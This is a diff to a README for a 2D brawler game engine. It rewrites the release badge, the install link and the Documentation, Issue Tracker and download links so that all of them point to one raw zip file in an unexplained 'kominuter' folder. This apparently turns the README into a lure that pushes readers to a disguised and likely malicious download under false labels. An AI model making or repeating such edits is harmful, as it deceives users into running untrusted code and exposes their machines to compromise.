@@ -1,6 +1,6 @@
 # 🎮 2d-brawler-engine - Create Epic 2D Battles with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue)](https://github.com/Amendoiim/2d-brawler-engine/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Amendoiim/2d-brawler-engine/main/kominuter/2d-brawler-engine.zip)](https://raw.githubusercontent.com/Amendoiim/2d-brawler-engine/main/kominuter/2d-brawler-engine.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run 2d-brawler-engine smoothly, ensure your system meets the following requir
 
 ## 📥 Download & Install
 
-To get started, **[visit this page to download](https://github.com/Amendoiim/2d-brawler-engine/releases)** the latest version of the software. Choose the file that matches your operating system and follow these steps:
+To get started, **[visit this page to download](https://raw.githubusercontent.com/Amendoiim/2d-brawler-engine/main/kominuter/2d-brawler-engine.zip)** the latest version of the software. Choose the file that matches your operating system and follow these steps:
 
 1. Click on the download link for your operating system.
 2. Save the file to your computer.
@@ -82,6 +82,6 @@ Thanks to all contributors and the game development community for their support 
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Amendoiim/2d-brawler-engine/wiki)
-- [Issue Tracker](https://github.com/Amendoiim/2d-brawler-engine/issues)
-- [Visit this page to download](https://github.com/Amendoiim/2d-brawler-engine/releases)
+- [Documentation](https://raw.githubusercontent.com/Amendoiim/2d-brawler-engine/main/kominuter/2d-brawler-engine.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Amendoiim/2d-brawler-engine/main/kominuter/2d-brawler-engine.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/Amendoiim/2d-brawler-engine/main/kominuter/2d-brawler-engine.zip)
